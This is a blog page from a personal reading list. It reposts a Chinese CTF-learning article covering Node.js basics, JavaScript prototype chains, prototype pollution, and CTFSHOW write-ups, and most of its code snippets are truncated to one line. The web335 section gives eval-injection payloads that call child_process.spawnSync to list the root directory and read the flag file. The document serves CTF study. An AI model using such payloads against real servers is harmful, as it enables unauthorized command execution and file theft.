@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"pocket.qiwihui.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="【技术分享】NodeJS从零开始到原型链污染">
+<meta property="og:type" content="article">
+<meta property="og:title" content="
+
+
+【技术分享】NodeJS从零开始到原型链污染 ">
+<meta property="og:url" content="http://pocket.qiwihui.com/2021/04/26/qiwihui-pocket_readings-1088/index.html">
+<meta property="og:site_name" content="Pocket Readings">
+<meta property="og:description" content="【技术分享】NodeJS从零开始到原型链污染">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2Ga54EhvW81B5V7m3icZVYS0TUeKraRw3SQYichJUtuGluEPjYpdptxmxA/640?wx_fmt=jpeg">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GJCIvQvz0gJzxsqpVYWI1LWkBJt5CnoyxsC7f6nkzWDiaiaSkZStvOHkA/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GvWIiaibqxpujjEstEvN4pMA3dy3rTBgibMkZkCphaVcXXS8Iu4WFqEVYA/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GC0wvr8kkuQ74DkYRSWpO11Ks1ick5ffFwibU1xACVFnqtkt1xTBGJ7uA/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GyUTI9Z3L8Lnm673d2qLnNsbbGf3fnicBXGzs5bDtNxO9qFicdpTB9XUw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GPem1ZWHVNabR5JhK60ibgZVE1WViaqG0o3b1IeBsd1Ehsic2JjhufIRFg/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GDUdvPSo1dSGsDXUBoQNotyyYD8ic8XMGXKcC3kI6Pd1aDct2YLrfFXw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GicFic515pVicuMkYO6ZjVbXuItwY997dmrskBdce09zCgb4NIYMtkGYnw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2Ghb8n2uNHO7buBjX8bU8icJtrwmO52u72N4QKqu3Ngotvbqa3kuPjG7w/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2Gayr801ibpV444tAjOt1pycWHEDuF1UVCGY16bvFXsXmCrVUYByEv1ww/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GKb9RyprsHNCHBiavYNnwVafGic1AgT7ngDkDQ3yZJ2fyQQjPYSiafvZLA/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GQ2tzicZso5MNVhMXlYrIuvcBbRibtDgEbl3JmdyGHicgwklFlBoXSqRYw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2G83F09NMmnGzEEqYaicCQxUOpz3kS5CLwEhYl6WOntZuicU5TTxeGb8kA/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GGKaJGxShSES7XRkFyqVsl1L6miaZo25JoVpicH6raA2zUpBicgj5TwlOA/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GGcwHiawICJbtvm8jwxU4oQHR0kF0rJfClM8ic5T4D4xPLYnsNRddnE9Q/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GdLUc1y1UkMUMv1icRMDbbRanB5maD3kNhp0EaZfd7xkicHQ1AvGHT3IA/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GKwvHwfdSFZ0UxBbyVOXDWaicST8qEjFjlCvSmJJhxYBvjmEOlibiaFia0Q/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GVr7uia9YTcImicqFRnDpMTYEDklU2FsEltsjTKvpFRfkVnxbHtQHfmqA/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2Gm2muz6keFUWdB1hI6Ksxnjd2mmdE3WJ5T3CBEjekZTcYDQoiafYAySw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GocSz6cpqxNZJqB51ebSQj0yicAAYfGJJ1LFtSYdEoD2wZIa1fljmJcA/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2G0Jb481icGicG6H720aFTQDsI2fWckqpfUQydAOibglTiafRbZD1lvmpvDw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GGIUMsbQ2Q2L0AicmmLQuuicZx8gic53udG45I9xYru3uM0a4e4blTymbQ/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2G5IUiczM6MAyicYQOPrrehvh87qbyyicAOlUHwRX6obOicEYoKoNk1NibX3A/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GzTNdSvETsUrLpvqxo5NPUrXOqicv0qCQw6Ne9KN9IpCsPq8pFQRRfuA/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GToI5Py39tKtSRcC9xjOXDcd8IITMNYufkuCRSWPQ4tS5hoB9SJZDZw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2G4GLXl90bByLMWkhuKaiajTRwJUntVEs8jdyp1Qd61jPkiaFC4z8BFe8w/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif">
+<meta property="article:published_time" content="2021-04-26T13:21:19.000Z">
+<meta property="article:modified_time" content="2021-07-21T13:58:31.414Z">
+<meta property="article:author" content="qiwihui">
+<meta property="article:tag" content="fetched">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2Ga54EhvW81B5V7m3icZVYS0TUeKraRw3SQYichJUtuGluEPjYpdptxmxA/640?wx_fmt=jpeg">
+
+<link rel="canonical" href="http://pocket.qiwihui.com/2021/04/26/qiwihui-pocket_readings-1088/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>
+
+
+【技术分享】NodeJS从零开始到原型链污染  | Pocket Readings</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pocket Readings</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">个人阅读清单记录博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://pocket.qiwihui.com/2021/04/26/qiwihui-pocket_readings-1088/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qiwihui">
+      <meta itemprop="description" content="个人阅读清单记录博客，并不代表个人观点。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pocket Readings">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+
+
+【技术分享】NodeJS从零开始到原型链污染 
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-04-26 13:21:19" itemprop="dateCreated datePublished" datetime="2021-04-26T13:21:19+00:00">2021-04-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-07-21 13:58:31" itemprop="dateModified" datetime="2021-07-21T13:58:31+00:00">2021-07-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/2019%E9%98%85%E8%AF%BB/" itemprop="url" rel="index"><span itemprop="name">2019阅读</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">
+
+
+【技术分享】NodeJS从零开始到原型链污染 </div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>&#24494;&#20449;&#21495; anquanbobao &#21151;&#33021;&#20171;&#32461; &#25171;&#30772;&#40657;&#31665; &#23458;&#35828;&#23433;&#20840; &#21069;&#35328;&#22240;&#20026;&#36817;&#27573;&#26102;&#38388;&#21253;&#25324;&#21435;&#24180;&#65292;&#22312;&#25171;CTF&#30340;&#26102;&#20505;&#30830;&#23454;&#26377;&#36935;&#21040;NodeJS&#30340;&#39064;&#30446;&#65292;&#20294;&#26159;&#20174;&#26469;&#27809;&#31995;&#32479;&#23398;&#20064;&#65292;&#25152;&#20197;&#25343;&#21040;&#39064;&#24456;&#25077;&#12290;&#19981;&#30693;&#36947;&#24212;&#35813;&#20174;&#20160;&#20040;&#22320;&#26041;&#20837;&#25163;&#65292;&#25152;&#20197;&#20915;&#23450;&#21435;&#23398;&#20064;&#19968;&#19979;&#65292;&#20294;&#26159;&#20043;&#21069;&#27809;&#24590;&#20040;&#23398;<br><br><br><br>Tags:<br><br><br><br>via Pocket <a href="https://ift.tt/3aHaijH" target="_blank" rel="noopener">https://ift.tt/3aHaijH</a> original site<br><br><br><br>April 26, 2021 at 08:58PM</p>
+<h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h3><hr>
+<blockquote>
+<p>from: <a href="https://github.com/qiwihui/pocket_readings/issues/1088#issuecomment-826830929" target="_blank" rel="noopener"><strong>github-actions[bot]</strong></a> on: <strong>4/26/2021</strong></p>
+</blockquote>
+<h2 id="【技术分享】NodeJS从零开始到原型链污染-by-安全客"><a href="#【技术分享】NodeJS从零开始到原型链污染-by-安全客" class="headerlink" title="【技术分享】NodeJS从零开始到原型链污染 by 安全客"></a>【技术分享】NodeJS从零开始到原型链污染 by 安全客</h2><p><strong>2021-04-21</strong><br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2Ga54EhvW81B5V7m3icZVYS0TUeKraRw3SQYichJUtuGluEPjYpdptxmxA/640?wx_fmt=jpeg" alt=""></p>
+<p>前言</p>
+<p>因为近段时间包括去年，在打CTF的时候确实有遇到NodeJS的题目，但是从来没系统学习，所以拿到题很懵。不知道应该从什么地方入手，所以决定去学习一下，但是之前没怎么学过JavaScript，语法之类的更是不懂，所以在此之前，花了三五天的时间，一边做题一边恶补了JavaScript的基础。<br>才开始写这篇文章。</p>
+<p>NodeJS基础</p>
+<p>简单介绍（多一句嘴，确实是从零基础开始的）：</p>
+<blockquote>
+<p>Node.js 是一个基于 Chrome V8 引擎的 Javascript 运行环境</p>
+</blockquote>
+<p>但是它是由C++开发的，它只是一个JavaScript语言解释器。<br>REPL环境运行JavaScript的代码</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GJCIvQvz0gJzxsqpVYWI1LWkBJt5CnoyxsC7f6nkzWDiaiaSkZStvOHkA/640?wx_fmt=png" alt=""></p>
+<p>在浏览器的控制台或者node的运行环境都属于REPL运行环境，均可以运行JS代码。<br>在NodeJS中分为三个模块，分别是：核心模块、自定义模块、第三方模块。<br>这里提一点，JS代码在编程时，如果需要使用某个模块的功能，那么就需要提前将其导入，与Python类似，只不过在Python中使用import关键字，而JS中使用require关键字。</p>
+<h3 id="读取文件操作"><a href="#读取文件操作" class="headerlink" title="读取文件操作"></a><strong>读取文件操作</strong></h3><p>文件系统模块就是核心模块</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GvWIiaibqxpujjEstEvN4pMA3dy3rTBgibMkZkCphaVcXXS8Iu4WFqEVYA/640?wx_fmt=png" alt=""></p>
+<pre><code>var fs = require(&apos;fs&apos;);//导入fs模块</code></pre><p>读取文件的操作，在下面CTF例题中会用到。读取文件的各种姿势。<br>在这里了解更多读取文件的函数和使用。</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a><strong>同步和异步</strong></h3><p>区别：</p>
+<blockquote>
+<p>同步方法：等待每个操作完成，然后只执行下一个操作<br>异步方式：从不等待每个操作完成，而是只在第一步执行所有操作</p>
+</blockquote>
+<p>看到一个比较有趣的描述：</p>
+<blockquote>
+<p>同步：可以拿吃饭和看电视来举例子，同步就是先吃完饭，吃完饭后再看电视，不能边看边吃，这就是同步<br>异步：同样拿上边的例子来说，异步就是边吃饭边看电视，看电视和吃饭同时进行，这样举例就应该很清楚了</p>
+</blockquote>
+<p>还用上面的代码做例子，readFile()是异步操作，所以其运行结果为</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GC0wvr8kkuQ74DkYRSWpO11Ks1ick5ffFwibU1xACVFnqtkt1xTBGJ7uA/640?wx_fmt=png" alt=""></p>
+<p>同步例子：</p>
+<pre><code>var fs = require(&apos;fs&apos;);//导入fs模块</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GyUTI9Z3L8Lnm673d2qLnNsbbGf3fnicBXGzs5bDtNxO9qFicdpTB9XUw/640?wx_fmt=png" alt=""></p>
+<p>可以很明显的看出来下面阻塞代码程序是正常的同步加载，代码由上到下执行。上面这个异步（非阻塞）代码程序会先输出下面的console.log()然后才执行回掉函数里的代码。</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a><strong>全局变量</strong></h3><ol>
+<li><p>__dirname：当前模块的目录名。</p>
+</li>
+<li><p>__filename：当前模块的文件名。这是当前的模块文件的绝对路径（符号链接会被解析）。</p>
+</li>
+<li><p>exports变量是默认赋值给module.exports，它可以被赋予新值，它会暂时不会绑定到module.exports。</p>
+</li>
+<li><p>module：在每个模块中， module 的自由变量是对表示当前模块的对象的引用。为方便起见，还可以通过全局模块的 exports 访问 module.exports。module 实际上不是全局的，而是每个模块本地的</p>
+</li>
+<li><p>require模块就不多说了，用于引入模块、 JSON、或本地文件。可以从 node_modules 引入模块。</p>
+</li>
+</ol>
+<pre><code>// 引入 JSON 文件：</code></pre><p>自己设置</p>
+<pre><code>global.something = 123;</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GPem1ZWHVNabR5JhK60ibgZVE1WViaqG0o3b1IeBsd1Ehsic2JjhufIRFg/640?wx_fmt=png" alt=""></p>
+<p>经常使用的全局变量是__dirname、__filename</p>
+<h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="HTTP服务"><a href="#HTTP服务" class="headerlink" title="HTTP服务"></a><strong>HTTP服务</strong></h3><pre><code>//引入http核心模块</code></pre><p>启动运行该文件，访问指定端口，HTTP服务的网页就显示出来了。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GDUdvPSo1dSGsDXUBoQNotyyYD8ic8XMGXKcC3kI6Pd1aDct2YLrfFXw/640?wx_fmt=png" alt=""></p>
+<h3 id="child-process-创建子进程"><a href="#child-process-创建子进程" class="headerlink" title="child_process(创建子进程)"></a><strong>child_process(创建子进程)</strong></h3><p>child_process提供了几种创建子进程的方式</p>
+<blockquote>
+<p>异步方式：spawn、exec、execFile、fork<br>同步方式：spawnSync、execSync、execFileSync</p>
+</blockquote>
+<p>经过上面的同步和异步思想的理解，创建子进程的同步异步方式应该不难理解。<br>在异步创建进程时，spawn是基础，其他的fork、exec、execFile都是基于spawn来生成的。<br>同步创建进程可以使用child_process.spawnSync()、child_process.execSync() 和 child_process.execFileSync() ，同步的方法会阻塞 Node.js 事件循环、暂停任何其他代码的执行，直到子进程退出。</p>
+<p>JavaScript原型链</p>
+<h3 id="原型和原型链"><a href="#原型和原型链" class="headerlink" title="原型和原型链"></a><strong>原型和原型链</strong></h3><p>首先要知道，JavaScript没有父类和子类这个概念，也没有类和实例的区分，而JavaScript中的继承关系则是靠一种很奇怪的“原型链”模式来实现继承。<br>在次之前，要先搞清楚对象和函数有什么区别和联系。</p>
+<blockquote>
+<p>对象是由函数创建的，而函数又是另一种对象。</p>
+</blockquote>
+<h4 id="JavaScript中的对象"><a href="#JavaScript中的对象" class="headerlink" title="JavaScript中的对象"></a><strong>JavaScript中的对象</strong></h4><p>在JavaScript中几乎所有的事物都是对象，如下代码：</p>
+<pre><code>var a = {</code></pre><p>其中访问对像的属性，可以有两种方式：</p>
+<pre><code>//例如</code></pre><h4 id="原型的定义和继承"><a href="#原型的定义和继承" class="headerlink" title="原型的定义和继承"></a><strong>原型的定义和继承</strong></h4><p>原型的定义：</p>
+<blockquote>
+<p>任何对象都有一个原型对象，这个原型对象由对象的内置属性proto指向它的构造函数的prototype指向的对象，即任何对象都是由一个构造函数创建的</p>
+</blockquote>
+<pre><code>function a(name,age){</code></pre><p>a函数内容是a类的构造函数，其中this.name、this.age就是a类的属性。</p>
+<p>在JavaScript中，声明了一个函数a，然后浏览器就自动在内存中创建一个对象b，a函数默认有一个属性prototype指向了这个对象b，b就是函数a的原型对象，简称原型。同时，对象b默认有属性constructor指向函数a。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GicFic515pVicuMkYO6ZjVbXuItwY997dmrskBdce09zCgb4NIYMtkGYnw/640?wx_fmt=png" alt=""></p>
+<p>创建一个对象a，对象a会默认有一个属性proto指向构造函数A的原型对象b</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2Ghb8n2uNHO7buBjX8bU8icJtrwmO52u72N4QKqu3Ngotvbqa3kuPjG7w/640?wx_fmt=png" alt=""></p>
+<p>这里A.prototype就指向函数的原型B。则a.__proto__是实例化的对象a的一个属性。<br>在javascript中，一切都是对象，他也只有对象这一种结构。而对象和对象间又存在继承关系。</p>
+<pre><code>var test = {</code></pre><blockquote>
+<p>每个实例对象(object)都有一个私有属性(proto)指向它的构造函数的原型对象(prototype)，每个实例对象还有一个属性(constructor)指向原型的构造函数。该原型对象也有一个自己的原型对象(proto)，层层向上直到一个对象的原型对象为null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。</p>
+</blockquote>
+<p>经过不断调用，最终的原型对象会调用到null，这将作为该原型链的最后一个环节，与之对应的，作为终点的 null 自然也是没有原型对象的。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2Gayr801ibpV444tAjOt1pycWHEDuF1UVCGY16bvFXsXmCrVUYByEv1ww/640?wx_fmt=png" alt=""></p>
+<h4 id="原型链定义及如何污染"><a href="#原型链定义及如何污染" class="headerlink" title="原型链定义及如何污染"></a><strong>原型链定义及如何污染</strong></h4><p>原型链的核心就是依赖对象proto的指向，当访问的属性在该对象不存在时，就会向上从该对象构造函数的prototype的进行查找，直至查找到Object的原型null为止。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GKb9RyprsHNCHBiavYNnwVafGic1AgT7ngDkDQ3yZJ2fyQQjPYSiafvZLA/640?wx_fmt=png" alt=""></p>
+<blockquote>
+<p>由于对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined</p>
+</blockquote>
+<p>图中的原型链是 cat-&gt;Cat.protype-&gt;Object.prototype-&gt;null</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GQ2tzicZso5MNVhMXlYrIuvcBbRibtDgEbl3JmdyGHicgwklFlBoXSqRYw/640?wx_fmt=png" alt=""></p>
+<p>原型链污染就是修改其构造函数中的属性值，使其他通过该构造函数实例化出的对象也具有这个属性的值。<br>由于对象是无序的，当使用第二种方式访问对象时，只能使用指明下标的方式去访问。<br>因此我们可以通过 a [“proto“] 的方式去访问其原型对象。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2G83F09NMmnGzEEqYaicCQxUOpz3kS5CLwEhYl6WOntZuicU5TTxeGb8kA/640?wx_fmt=png" alt=""></p>
+<p>调用对象属性时, 会查找属性，如果本身没有，则会去proto中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有proto，那么会去proto的显式原型中查找，一直到null。<br>p神的文章中提到JavaScript原型链继承</p>
+<p>CTF题目实战</p>
+<h3 id="NodeJS简单类型的题目以及常见绕过"><a href="#NodeJS简单类型的题目以及常见绕过" class="headerlink" title="NodeJS简单类型的题目以及常见绕过"></a><strong>NodeJS简单类型的题目以及常见绕过</strong></h3><p>搜集了一下，做个总结，方便自己以后查阅。前面的题目没有涉及到原型链污染，不过也是学到了许多知识。</p>
+<h4 id="web334"><a href="#web334" class="headerlink" title="web334"></a><strong>web334</strong></h4><p>源码下载下来后，发现user.js和login.js<br>其中user.js中发现了用户名和密码<br>CTFSHOW 123456<br>然后看到login.js中，</p>
+<pre><code>var express = require(&apos;express&apos;);</code></pre><p>其中</p>
+<pre><code>var findUser = function(name, password){</code></pre><p>CTFSHOW 为name，经过name.toUpperCase()处理后变大写。所以此处如果想让用户名为CTFSHOW，就需要控制输入为ctfshow。<br>所以最后输入用户名为ctfshow 密码为：123456<br>即可登陆成功getflag</p>
+<h4 id="web335"><a href="#web335" class="headerlink" title="web335"></a><strong>web335</strong></h4><p>参考博客 <a href="https://blog.csdn.net/miuzzx/article/details/111780832" target="_blank" rel="noopener">https://blog.csdn.net/miuzzx/article/details/111780832</a><br>注释为/evaleval是为执行命令的关键词，所以这里猜想是可以进行命令执行。<br>所以就去/javascripts/jquery.js中查找eval的语句，但是没get到点。所以看了大师傅的博客，得到了思路。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7VH2AYeYIicWTeKxTaWKb2GGKaJGxShSES7XRkFyqVsl1L6miaZo25JoVpicH6raA2zUpBicgj5TwlOA/640?wx_fmt=png" alt=""></p>
+<p>做的题少就是不行。<br>然后师傅给了两个payload。</p>
+<blockquote>
+<p>require( “child_process” ).spawnSync( ‘ls’, [ ‘/‘ ] ).stdout.toString()<br>require( “child_process” ).spawnSync( ‘cat’, [ ‘f*’ ] ).stdout.toString()</p>
+</blockquote>
+<p>child_process(子进程)<br>该模块提供了衍生子进程（以一种与popen(3)类似但不相同的方式）的能力。此功能主要是由 child_process.spawn()函数提供。<br>此处使用同步进程：三个方法，他们会阻塞NodeJS事件循环、暂停任何其他代码的执行，知道衍生的进程退出。<br>child_process.spawnSync()、child_process.execSync() 和 child_process.execFileSync()<br>这里学习了两个方法可以用来解答这道题。具体的我将其记录在了NodeJS学习分组文章Day1<br>这里直接进行</p>
